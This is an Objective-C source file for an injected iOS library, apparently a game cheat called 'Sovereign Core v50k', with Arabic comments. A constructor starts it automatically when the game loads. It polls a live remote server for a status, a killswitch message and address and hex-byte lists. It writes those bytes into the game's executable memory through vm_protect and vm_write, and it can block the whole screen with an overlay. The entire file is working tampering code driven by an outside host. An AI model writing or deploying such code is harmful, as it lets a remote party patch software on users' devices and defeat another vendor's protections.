/**
 * ==============================================================================
 * Project: Sovereign Cloud Agent v50k (The Warhead)
 * Architect: Eng. Wissam Al-Safi (Basra/Nasiriyah)
 * Feature: Dynamic C2 Injection, Killswitch, Full Memory Patching
 * ==============================================================================
 */

#import <UIKit/UIKit.h>
#import <mach-o/dyld.h>
#import <mach/mach.h>
#import <Foundation/Foundation.h>

// ==============================================================================
// 🎯 إحداثيات مركز القيادة (تم تضمين رابط الجنرال وسام بدون https)
// ==============================================================================
#define SERVER_API @"http://files.free.nf/wsam_core/dashboard_v50.php?api=true"

@interface SovereignCloudUI : UIView
@property (nonatomic, strong) UILabel *titleLabel;
@property (nonatomic, strong) UILabel *actionLabel;
@property (nonatomic, strong) UIView *lampIndicator;
@end

@implementation SovereignCloudUI

#pragma mark - 1. مرحلة التكوين والبناء (Initialization)
- (instancetype)initWithFrame:(CGRect)frame {
    self = [super initWithFrame:frame];
    if (self) {
        [self setupTacticalUI];
        [self initiateCloudUplink]; // إطلاق إشارة الالتحام فوراً
    }
    return self;
}

- (void)setupTacticalUI {
    // تصميم الدرع البصري (كحلي غامق مع حدود سيان)
    self.backgroundColor = [[UIColor colorWithRed:0.05 green:0.08 blue:0.12 alpha:0.9] colorWithAlphaComponent:0.9];
    self.layer.cornerRadius = 12;
    self.layer.borderColor = [UIColor cyanColor].CGColor;
    self.layer.borderWidth = 1.0;
    self.clipsToBounds = YES;

    // العنوان السيادي
    self.titleLabel = [[UILabel alloc] initWithFrame:CGRectMake(10, 5, 140, 15)];
    self.titleLabel.text = @"Sovereign Core v50k";
    self.titleLabel.textColor = [UIColor whiteColor];
    self.titleLabel.font = [UIFont boldSystemFontOfSize:10];
    [self addSubview:self.titleLabel];

    // نص الحدث (جاري الاتصال، مفعل، الخ)
    self.actionLabel = [[UILabel alloc] initWithFrame:CGRectMake(10, 25, 160, 20)];
    self.actionLabel.font = [UIFont boldSystemFontOfSize:11];
    [self addSubview:self.actionLabel];

    // اللمبة السيادية
    self.lampIndicator = [[UIView alloc] initWithFrame:CGRectMake(self.frame.size.width - 20, 27, 10, 10)];
    self.lampIndicator.layer.cornerRadius = 5;
    [self addSubview:self.lampIndicator];

    // الحالة صفر: أصفر (جاري الاتصال)
    [self changeSystemState:[UIColor yellowColor] text:@"جاري الاتصال بالسيرفر..."];
}

- (void)changeSystemState:(UIColor *)color text:(NSString *)text {
    dispatch_async(dispatch_get_main_queue(), ^{
        [UIView animateWithDuration:0.4 animations:^{
            self.actionLabel.text = text;
            self.actionLabel.textColor = color;
            self.lampIndicator.backgroundColor = color;
            self.layer.borderColor = color.CGColor;
            
            // إضافة توهج (Glow) للمبة
            self.lampIndicator.layer.shadowColor = color.CGColor;
            self.lampIndicator.layer.shadowRadius = 8;
            self.lampIndicator.layer.shadowOpacity = 1;
        }];
    });
}

#pragma mark - 2. الالتحام السحابي (Cloud Uplink)
- (void)initiateCloudUplink {
    // ننتظر 3 ثوانٍ حتى تستقر واجهة اللعبة قبل الاتصال
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        
        NSURL *url = [NSURL URLWithString:SERVER_API];
        NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
        req.timeoutInterval = 10.0;
        
        [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *res, NSError *err) {
            
            if (err || !data) {
                [self changeSystemState:[UIColor redColor] text:@"فشل الاتصال بالقيادة!"];
                return;
            }

            // فك تشفير البيانات القادمة من قاعدة البيانات (SQLite)
            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
            if (!json) return;

            NSString *status = json[@"status"];
            NSString *message = json[@"message"];

            // 🛑 بروتوكول الإيقاف الشامل (Maintenance Killswitch)
            if ([status isEqualToString:@"maintenance"]) {
                [self engageMaintenanceLockdown:message];
                return; 
            }
            
            // ⚠️ بروتوكول الانكشاف (Detected)
            if ([status isEqualToString:@"detected"]) {
                [self changeSystemState:[UIColor redColor] text:message];
                [self startRedAlertPulse];
                return; 
            }

            // ✅ بروتوكول السيادة (Safe) -> تفريغ الحمولة في الذاكرة
            if ([status isEqualToString:@"safe"]) {
                [self changeSystemState:[UIColor cyanColor] text:@"جاري حقن النظام..."];
                
                dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
                    
                    // حقن الجداول الثلاثة مليمتر بمليمتر
                    [self executePatchEngine:json[@"protection"] category:@"Protection"];
                    [self executePatchEngine:json[@"radar"] category:@"Radar"];
                    [self executePatchEngine:json[@"features"] category:@"Features"];
                    
                    dispatch_async(dispatch_get_main_queue(), ^{
                        [self changeSystemState:[UIColor greenColor] text:@"تم تفعيل الحماية ✅"];
                    });
                });
            }
        }] resume];
    });
}

#pragma mark - 3. بروتوكول الصيانة (The Black Shield)
- (void)engageMaintenanceLockdown:(NSString *)msg {
    dispatch_async(dispatch_get_main_queue(), ^{
        self.hidden = YES; // إخفاء المربع الصغير
        
        // نشر درع أسود يغطي شاشة الآيفون بالكامل
        UIWindow *win = [[UIApplication sharedApplication] keyWindow];
        UIView *lockdownView = [[UIView alloc] initWithFrame:win.bounds];
        lockdownView.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.95];
        lockdownView.userInteractionEnabled = YES; // يمنع اللاعب من لمس أي شيء في اللعبة
        
        UILabel *title = [[UILabel alloc] initWithFrame:CGRectMake(0, win.bounds.size.height/2 - 60, win.bounds.size.width, 40)];
        title.text = @"🛑 النظام تحت الصيانة 🛑";
        title.textColor = [UIColor orangeColor];
        title.font = [UIFont boldSystemFontOfSize:24];
        title.textAlignment = NSTextAlignmentCenter;
        [lockdownView addSubview:title];
        
        UILabel *message = [[UILabel alloc] initWithFrame:CGRectMake(20, win.bounds.size.height/2, win.bounds.size.width - 40, 80)];
        message.text = msg;
        message.textColor = [UIColor whiteColor];
        message.font = [UIFont systemFontOfSize:16];
        message.numberOfLines = 0;
        message.textAlignment = NSTextAlignmentCenter;
        [lockdownView addSubview:message];
        
        [win addSubview:lockdownView];
    });
}

#pragma mark - 4. محرك الحقن المليمتري (Memory Patching Engine)
- (void)executePatchEngine:(NSArray *)offsets category:(NSString *)catName {
    if (!offsets || offsets.count == 0) return;
    
    // حساب أساس الذاكرة (ASLR Slide)
    uintptr_t aslr_slide = _dyld_get_image_vmaddr_slide(0); 
    mach_port_t task = mach_task_self();
    
    for (NSDictionary *off in offsets) {
        NSString *name = off[@"name"];
        uintptr_t address = strtoull([off[@"address"] UTF8String], NULL, 16);
        uintptr_t target_addr = aslr_slide + address;
        
        NSString *hexStr = off[@"hex"];
        NSMutableData *patchData = [NSMutableData data];
        for (int i = 0; i + 2 <= hexStr.length; i += 2) {
            unsigned int byteVal;
            [[NSScanner scannerWithString:[hexStr substringWithRange:NSMakeRange(i, 2)]] scanHexInt:&byteVal];
            unsigned char c = (unsigned char)byteVal;
            [patchData appendBytes:&c length:1];
        }
        
        // 1. فتح الذاكرة (rwx)
        kern_return_t kr = vm_protect(task, (vm_address_t)target_addr, patchData.length, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
        if (kr == KERN_SUCCESS) {
            // 2. حقن الأوفست (Patching)
            vm_write(task, (vm_address_t)target_addr, (vm_offset_t)patchData.bytes, (mach_msg_type_number_t)patchData.length);
            // 3. إغلاق الذاكرة للتخفي (r-x)
            vm_protect(task, (vm_address_t)target_addr, patchData.length, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
            NSLog(@"[Sovereign - %@] Injected: %@", catName, name);
        } else {
            NSLog(@"[Sovereign - %@] Failed to inject: %@", catName, name);
        }
    }
}

// تأثير الإنذار الأحمر
- (void)startRedAlertPulse {
    CABasicAnimation *pulse = [CABasicAnimation animationWithKeyPath:@"opacity"];
    pulse.duration = 0.3; pulse.repeatCount = HUGE_VALF; pulse.autoreverses = YES;
    pulse.fromValue = @1.0; pulse.toValue = @0.2;
    [self.lampIndicator.layer addAnimation:pulse forKey:@"pulse"];
}

#pragma mark - 5. نظام التحريك اليدوي (Draggable UI)
- (void)makeDraggable {
    self.userInteractionEnabled = YES;
    UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(handlePan:)];
    [self addGestureRecognizer:pan];
}
- (void)handlePan:(UIPanGestureRecognizer *)gesture {
    CGPoint trans = [gesture translationInView:self.superview];
    self.center = CGPointMake(self.center.x + trans.x, self.center.y + trans.y);
    [gesture setTranslation:CGPointZero inView:self.superview];
}
@end

#pragma mark - 6. صاعق الانطلاق (The Ignition)
void __attribute__((constructor)) start_sovereign_core() {
    // ننتظر 5 ثوانٍ بعد فتح اللعبة ليتم رسم الواجهة
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        UIWindow *window = [[UIApplication sharedApplication] keyWindow];
        if (window) {
            SovereignCloudUI *ui = [[SovereignCloudUI alloc] initWithFrame:CGRectMake(40, 60, 190, 50)];
            [ui makeDraggable];
            [window addSubview:ui];
        }
    });
}


